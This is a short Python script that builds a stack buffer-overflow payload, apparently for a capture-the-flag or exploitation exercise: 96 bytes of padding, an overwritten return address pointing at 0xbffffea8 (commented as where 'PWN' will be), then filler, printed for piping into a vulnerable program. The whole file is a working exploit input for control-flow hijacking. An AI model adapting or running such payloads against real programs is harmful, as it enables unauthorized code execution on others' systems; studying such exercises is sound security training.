#!/usr/bin/env python

buf = ""
buf += "A"*96
buf += "\xa8\xfe\xff\xbf" #PWN will be at 0xbffffea8
buf += "CCCC" * (400 - 96 - 4)

print(buf)

